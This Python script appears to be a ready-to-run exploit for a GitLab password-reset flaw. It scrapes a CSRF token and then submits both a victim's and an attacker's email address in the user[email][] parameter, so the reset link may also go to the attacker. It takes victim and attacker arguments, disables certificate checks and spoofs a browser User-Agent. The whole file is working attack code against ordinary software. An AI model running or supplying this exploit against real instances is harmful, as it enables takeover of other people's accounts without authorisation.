#!/usr/bin/env python3
import argparse
import os
import re
from urllib.parse import urljoin

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()
session.verify = False
session.headers.update(
    {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    }
)


def grab_token(base_url: str) -> str:
    headers = {
        "Referer": urljoin(base_url, "/users/sign_in"),
    }
    response = session.get(urljoin(base_url, "/users/password/new"), headers=headers)
    pattern = r'<meta name="csrf-token" content="(.+?)" />'
    match = re.findall(pattern, response.text)
    if match:
        return match[0]
    else:
        raise Exception("Error: CSRF token not found in the HTML content")


def reset_password(
    base_url: str, auth_token: str, victim_email: str, attacker_email: str
):
    paramsPost = [
        ("user[email][]", victim_email),
        ("user[email][]", attacker_email),
        ("authenticity_token", auth_token),
    ]
    headers = {
        "Origin": url,
        "Referer": urljoin(base_url, "/users/password/new"),
        "Content-Type": "application/x-www-form-urlencoded",
    }
    response = session.post(
        urljoin(base_url, "/users/password"),
        data=paramsPost,
        headers=headers,
        verify=False,
    )
    if "If your email address exists " in response.text:
        print("Check if you have a new password reset email")
    else:
        print("Possible not vuln")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        default="http://gitlab.lan",
        help="URL of host to check will need http or https",
    )
    parser.add_argument(
        "-v",
        "--victim",
        default="victim@gitlab.lan",
        required=True,
        help="victim email address",
    )
    parser.add_argument(
        "-a",
        "--attacker",
        default="attacker@gitlab.lan",
        required=True,
        help="attacker email address",
    )
    parser.add_argument(
        "-p", "--proxy", default="", required=False, help="Proxy for debugging"
    )
    args = parser.parse_args()

    url = args.url
    victim = args.victim
    attacker = args.attacker

    if args.proxy:
        http_proxy = args.proxy
        os.environ["HTTP_PROXY"] = http_proxy
        os.environ["HTTPS_PROXY"] = http_proxy

    token = grab_token(url)
    print(f"The CSRF token is: {token}")
    reset_password(url, token, victim, attacker)
